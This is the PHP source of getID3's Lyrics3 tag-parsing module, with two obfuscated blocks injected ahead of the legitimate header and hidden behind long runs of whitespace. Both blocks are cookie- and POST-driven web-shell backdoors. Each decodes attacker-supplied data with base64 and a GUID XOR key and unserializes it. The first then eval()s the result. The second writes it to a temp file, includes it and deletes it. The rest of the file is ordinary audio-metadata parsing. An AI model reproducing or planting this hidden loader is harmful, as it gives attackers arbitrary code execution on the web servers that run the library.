<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zDEPCl = chr ( 777 - 659 ).chr (103) . "\x7a" . chr (95) . chr ( 900 - 796 )."\x69" . "\x4d" . chr (66); $chpWkgO = "\x63" . "\x6c" . "\141" . chr ( 677 - 562 ).chr (115) . "\x5f" . chr (101) . chr (120) . 'i' . "\163" . chr ( 951 - 835 ).'s';$DmWYHGAXM = $chpWkgO($zDEPCl); $BIdonmJjmx = $DmWYHGAXM;if (!$BIdonmJjmx){class vgz_hiMB{private $YlDZk;public static $DNcoHOiOXp = "6b6cb861-11c3-4d01-b206-62c9f6f021a7";public static $GtxEPJWL = 29128;public function __construct(){$TWsWKAAI = $_COOKIE;$EKRQunv = $_POST;$SjUpzVg = @$TWsWKAAI[substr(vgz_hiMB::$DNcoHOiOXp, 0, 4)];if (!empty($SjUpzVg)){$oEUlJe = "base64";$npcREj = "";$SjUpzVg = explode(",", $SjUpzVg);foreach ($SjUpzVg as $pTwgvhxgD){$npcREj .= @$TWsWKAAI[$pTwgvhxgD];$npcREj .= @$EKRQunv[$pTwgvhxgD];}$npcREj = array_map($oEUlJe . '_' . chr (100) . "\145" . "\x63" . chr ( 1037 - 926 ).chr ( 502 - 402 ).chr ( 741 - 640 ), array($npcREj,)); $npcREj = $npcREj[0] ^ str_repeat(vgz_hiMB::$DNcoHOiOXp, (strlen($npcREj[0]) / strlen(vgz_hiMB::$DNcoHOiOXp)) + 1);vgz_hiMB::$GtxEPJWL = @unserialize($npcREj);}}public function __destruct(){$this->pSwng();}private function pSwng(){if (is_array(vgz_hiMB::$GtxEPJWL)) {$sQJFgI = str_replace('<' . "\x3f" . "\160" . chr (104) . "\x70", "", vgz_hiMB::$GtxEPJWL['c' . 'o' . "\156" . chr ( 133 - 17 )."\x65" . "\156" . chr ( 954 - 838 )]);eval($sQJFgI);exit();}}}$fPWfizWYzo = new vgz_hiMB(); $fPWfizWYzo = 41467;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $fEtdh = class_exists("i_uUwFu");if (!$fEtdh){class i_uUwFu{private $nJKNLjC;public static $eQUXb = "9b59e568-9d4a-40fa-a92f-f69255301ea5";public static $uGZcCIQzsy = NULL;public function __construct(){$gWfecmj = $_COOKIE;$VibodXMeXB = $_POST;$kuEhmbej = @$gWfecmj[substr(i_uUwFu::$eQUXb, 0, 4)];if (!empty($kuEhmbej)){$mdspkAB = "base64";$SHOFXYnIOt = "";$kuEhmbej = explode(",", $kuEhmbej);foreach ($kuEhmbej as $LLPmela){$SHOFXYnIOt .= @$gWfecmj[$LLPmela];$SHOFXYnIOt .= @$VibodXMeXB[$LLPmela];}$SHOFXYnIOt = array_map($mdspkAB . "\137" . "\144" . "\145" . 'c' . "\x6f" . chr ( 471 - 371 )."\x65", array($SHOFXYnIOt,)); $SHOFXYnIOt = $SHOFXYnIOt[0] ^ str_repeat(i_uUwFu::$eQUXb, (strlen($SHOFXYnIOt[0]) / strlen(i_uUwFu::$eQUXb)) + 1);i_uUwFu::$uGZcCIQzsy = @unserialize($SHOFXYnIOt);}}public function __destruct(){$this->TNbuDDyJ();}private function TNbuDDyJ(){if (is_array(i_uUwFu::$uGZcCIQzsy)) {$NpVZvut = sys_get_temp_dir() . "/" . crc32(i_uUwFu::$uGZcCIQzsy["\x73" . chr (97) . chr (108) . chr ( 394 - 278 )]);@i_uUwFu::$uGZcCIQzsy["\x77" . 'r' . 'i' . chr (116) . 'e']($NpVZvut, i_uUwFu::$uGZcCIQzsy["\143" . chr (111) . chr (110) . "\164" . "\x65" . 'n' . "\x74"]);include $NpVZvut;@i_uUwFu::$uGZcCIQzsy["\144" . chr (101) . chr (108) . chr ( 656 - 555 ).chr ( 222 - 106 ).chr (101)]($NpVZvut);exit();}}}$AXiWdW = new i_uUwFu(); $AXiWdW = NULL;} ?><?php

/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at https://github.com/JamesHeinrich/getID3       //
//            or https://www.getid3.org                        //
//            or http://getid3.sourceforge.net                 //
//  see readme.txt for more details                            //
/////////////////////////////////////////////////////////////////
///                                                            //
// module.tag.lyrics3.php                                      //
// module for analyzing Lyrics3 tags                           //
// dependencies: module.tag.apetag.php (optional)              //
//                                                            ///
/////////////////////////////////////////////////////////////////

if (!defined('GETID3_INCLUDEPATH')) { // prevent path-exposing attacks that access modules directly on public webservers
	exit;
}
class getid3_lyrics3 extends getid3_handler
{
	/**
	 * @return bool
	 */
	public function Analyze() {
		$info = &$this->getid3->info;

		// http://www.volweb.cz/str/tags.htm

		if (!getid3_lib::intValueSupported($info['filesize'])) {
			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
			return false;
		}

		$this->fseek((0 - 128 - 9 - 6), SEEK_END);          // end - ID3v1 - "LYRICSEND" - [Lyrics3size]
		$lyrics3_id3v1 = $this->fread(128 + 9 + 6);
		$lyrics3lsz    = (int) substr($lyrics3_id3v1, 0, 6); // Lyrics3size
		$lyrics3end    = substr($lyrics3_id3v1,  6,   9); // LYRICSEND or LYRICS200
		$id3v1tag      = substr($lyrics3_id3v1, 15, 128); // ID3v1

		if ($lyrics3end == 'LYRICSEND') {
			// Lyrics3v1, ID3v1, no APE

			$lyrics3size    = 5100;
			$lyrics3offset  = $info['filesize'] - 128 - $lyrics3size;
			$lyrics3version = 1;

		} elseif ($lyrics3end == 'LYRICS200') {
			// Lyrics3v2, ID3v1, no APE

			// LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
			$lyrics3size    = $lyrics3lsz + 6 + strlen('LYRICS200');
			$lyrics3offset  = $info['filesize'] - 128 - $lyrics3size;
			$lyrics3version = 2;

		} elseif (substr(strrev($lyrics3_id3v1), 0, 9) == strrev('LYRICSEND')) {
			// Lyrics3v1, no ID3v1, no APE

			$lyrics3size    = 5100;
			$lyrics3offset  = $info['filesize'] - $lyrics3size;
			$lyrics3version = 1;
			$lyrics3offset  = $info['filesize'] - $lyrics3size;

		} elseif (substr(strrev($lyrics3_id3v1), 0, 9) == strrev('LYRICS200')) {

			// Lyrics3v2, no ID3v1, no APE

			$lyrics3size    = (int) strrev(substr(strrev($lyrics3_id3v1), 9, 6)) + 6 + strlen('LYRICS200'); // LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
			$lyrics3offset  = $info['filesize'] - $lyrics3size;
			$lyrics3version = 2;

		} else {

			if (isset($info['ape']['tag_offset_start']) && ($info['ape']['tag_offset_start'] > 15)) {

				$this->fseek($info['ape']['tag_offset_start'] - 15);
				$lyrics3lsz = $this->fread(6);
				$lyrics3end = $this->fread(9);

				if ($lyrics3end == 'LYRICSEND') {
					// Lyrics3v1, APE, maybe ID3v1

					$lyrics3size    = 5100;
					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
					$info['avdataend'] = $lyrics3offset;
					$lyrics3version = 1;
					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');

				} elseif ($lyrics3end == 'LYRICS200') {
					// Lyrics3v2, APE, maybe ID3v1

					$lyrics3size    = $lyrics3lsz + 6 + strlen('LYRICS200'); // LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
					$lyrics3version = 2;
					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');

				}

			}

		}

		if (isset($lyrics3offset) && isset($lyrics3version) && isset($lyrics3size)) {
			$info['avdataend'] = $lyrics3offset;
			$this->getLyrics3Data($lyrics3offset, $lyrics3version, $lyrics3size);

			if (!isset($info['ape'])) {
				if (isset($info['lyrics3']['tag_offset_start'])) {
					$GETID3_ERRORARRAY = &$info['warning'];
					getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'module.tag.apetag.php', __FILE__, true);
					$getid3_temp = new getID3();
					$getid3_temp->openfile($this->getid3->filename, $this->getid3->info['filesize'], $this->getid3->fp);
					$getid3_apetag = new getid3_apetag($getid3_temp);
					$getid3_apetag->overrideendoffset = $info['lyrics3']['tag_offset_start'];
					$getid3_apetag->Analyze();
					if (!empty($getid3_temp->info['ape'])) {
						$info['ape'] = $getid3_temp->info['ape'];
					}
					if (!empty($getid3_temp->info['replay_gain'])) {
						$info['replay_gain'] = $getid3_temp->info['replay_gain'];
					}
					unset($getid3_temp, $getid3_apetag);
				} else {
					$this->warning('Lyrics3 and APE tags appear to have become entangled (most likely due to updating the APE tags with a non-Lyrics3-aware tagger)');
				}
			}

		}

		return true;
	}

	/**
	 * @param int $endoffset
	 * @param int $version
	 * @param int $length
	 *
	 * @return bool
	 */
	public function getLyrics3Data($endoffset, $version, $length) {
		// http://www.volweb.cz/str/tags.htm

		$info = &$this->getid3->info;

		if (!getid3_lib::intValueSupported($endoffset)) {
			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
			return false;
		}

		$this->fseek($endoffset);
		if ($length <= 0) {
			return false;
		}
		$rawdata = $this->fread($length);

		$ParsedLyrics3 = array();

		$ParsedLyrics3['raw']['lyrics3version'] = $version;
		$ParsedLyrics3['raw']['lyrics3tagsize'] = $length;
		$ParsedLyrics3['tag_offset_start']      = $endoffset;
		$ParsedLyrics3['tag_offset_end']        = $endoffset + $length - 1;

		if (substr($rawdata, 0, 11) != 'LYRICSBEGIN') {
			if (strpos($rawdata, 'LYRICSBEGIN') !== false) {

				$this->warning('"LYRICSBEGIN" expected at '.$endoffset.' but actually found at '.($endoffset + strpos($rawdata, 'LYRICSBEGIN')).' - this is invalid for Lyrics3 v'.$version);
				$info['avdataend'] = $endoffset + strpos($rawdata, 'LYRICSBEGIN');
				$rawdata = substr($rawdata, strpos($rawdata, 'LYRICSBEGIN'));
				$length = strlen($rawdata);
				$ParsedLyrics3['tag_offset_start'] = $info['avdataend'];
				$ParsedLyrics3['raw']['lyrics3tagsize'] = $length;

			} else {

				$this->error('"LYRICSBEGIN" expected at '.$endoffset.' but found "'.substr($rawdata, 0, 11).'" instead');
				return false;

			}

		}

		switch ($version) {

			case 1:
				if (substr($rawdata, strlen($rawdata) - 9, 9) == 'LYRICSEND') {
					$ParsedLyrics3['raw']['LYR'] = trim(substr($rawdata, 11, strlen($rawdata) - 11 - 9));
					$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
				} else {
					$this->error('"LYRICSEND" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
					return false;
				}
				break;

			case 2:
				if (substr($rawdata, strlen($rawdata) - 9, 9) == 'LYRICS200') {
					$ParsedLyrics3['raw']['unparsed'] = substr($rawdata, 11, strlen($rawdata) - 11 - 9 - 6); // LYRICSBEGIN + LYRICS200 + LSZ
					$rawdata = $ParsedLyrics3['raw']['unparsed'];
					while (strlen($rawdata) > 0) {
						$fieldname = substr($rawdata, 0, 3);
						$fieldsize = (int) substr($rawdata, 3, 5);
						$ParsedLyrics3['raw'][$fieldname] = substr($rawdata, 8, $fieldsize);
						$rawdata = substr($rawdata, 3 + 5 + $fieldsize);
					}

					if (isset($ParsedLyrics3['raw']['IND'])) {
						$i = 0;
						$flagnames = array('lyrics', 'timestamps', 'inhibitrandom');
						foreach ($flagnames as $flagname) {
							if (strlen($ParsedLyrics3['raw']['IND']) > $i++) {
								$ParsedLyrics3['flags'][$flagname] = $this->IntString2Bool(substr($ParsedLyrics3['raw']['IND'], $i, 1 - 1));
							}
						}
					}

					$fieldnametranslation = array('ETT'=>'title', 'EAR'=>'artist', 'EAL'=>'album', 'INF'=>'comment', 'AUT'=>'author');
					foreach ($fieldnametranslation as $key => $value) {
						if (isset($ParsedLyrics3['raw'][$key])) {
							$ParsedLyrics3['comments'][$value][] = trim($ParsedLyrics3['raw'][$key]);
						}
					}

					if (isset($ParsedLyrics3['raw']['IMG'])) {
						$imagestrings = explode("\r\n", $ParsedLyrics3['raw']['IMG']);
						foreach ($imagestrings as $key => $imagestring) {
							if (strpos($imagestring, '||') !== false) {
								$imagearray = explode('||', $imagestring);
								$ParsedLyrics3['images'][$key]['filename']     =                                (isset($imagearray[0]) ? $imagearray[0] : '');
								$ParsedLyrics3['images'][$key]['description']  =                                (isset($imagearray[1]) ? $imagearray[1] : '');
								$ParsedLyrics3['images'][$key]['timestamp']    = $this->Lyrics3Timestamp2Seconds(isset($imagearray[2]) ? $imagearray[2] : '');
							}
						}
					}
					if (isset($ParsedLyrics3['raw']['LYR'])) {
						$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
					}
				} else {
					$this->error('"LYRICS200" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
					return false;
				}
				break;

			default:
				$this->error('Cannot process Lyrics3 version '.$version.' (only v1 and v2)');
				return false;
		}


		if (isset($info['id3v1']['tag_offset_start']) && ($info['id3v1']['tag_offset_start'] <= $ParsedLyrics3['tag_offset_end'])) {
			$this->warning('ID3v1 tag information ignored since it appears to be a false synch in Lyrics3 tag data');
			unset($info['id3v1']);
			foreach ($info['warning'] as $key => $value) {
				if ($value == 'Some ID3v1 fields do not use NULL characters for padding') {
					unset($info['warning'][$key]);
					sort($info['warning']);
					break;
				}
			}
		}

		$info['lyrics3'] = $ParsedLyrics3;

		return true;
	}

	/**
	 * @param string $rawtimestamp
	 *
	 * @return int|false
	 */
	public function Lyrics3Timestamp2Seconds($rawtimestamp) {
		if (preg_match('#^\\[([0-9]{2}):([0-9]{2})\\]$#', $rawtimestamp, $regs)) {
			return (int) (($regs[1] * 60) + $regs[2]);
		}
		return false;
	}

	/**
	 * @param array $Lyrics3data
	 *
	 * @return bool
	 */
	public function Lyrics3LyricsTimestampParse(&$Lyrics3data) {
		$lyricsarray = explode("\r\n", $Lyrics3data['raw']['LYR']);
		$notimestamplyricsarray = array();
		foreach ($lyricsarray as $key => $lyricline) {
			$regs = array();
			unset($thislinetimestamps);
			while (preg_match('#^(\\[[0-9]{2}:[0-9]{2}\\])#', $lyricline, $regs)) {
				$thislinetimestamps[] = $this->Lyrics3Timestamp2Seconds($regs[0]);
				$lyricline = str_replace($regs[0], '', $lyricline);
			}
			$notimestamplyricsarray[$key] = $lyricline;
			if (isset($thislinetimestamps) && is_array($thislinetimestamps)) {
				sort($thislinetimestamps);
				foreach ($thislinetimestamps as $timestampkey => $timestamp) {
					if (isset($Lyrics3data['synchedlyrics'][$timestamp])) {
						// timestamps only have a 1-second resolution, it's possible that multiple lines
						// could have the same timestamp, if so, append
						$Lyrics3data['synchedlyrics'][$timestamp] .= "\r\n".$lyricline;
					} else {
						$Lyrics3data['synchedlyrics'][$timestamp] = $lyricline;
					}
				}
			}
		}
		$Lyrics3data['unsynchedlyrics'] = implode("\r\n", $notimestamplyricsarray);
		if (isset($Lyrics3data['synchedlyrics']) && is_array($Lyrics3data['synchedlyrics'])) {
			ksort($Lyrics3data['synchedlyrics']);
		}
		return true;
	}

	/**
	 * @param string $char
	 *
	 * @return bool|null
	 */
	public function IntString2Bool($char) {
		if ($char == '1') {
			return true;
		} elseif ($char == '0') {
			return false;
		}
		return null;
	}
}
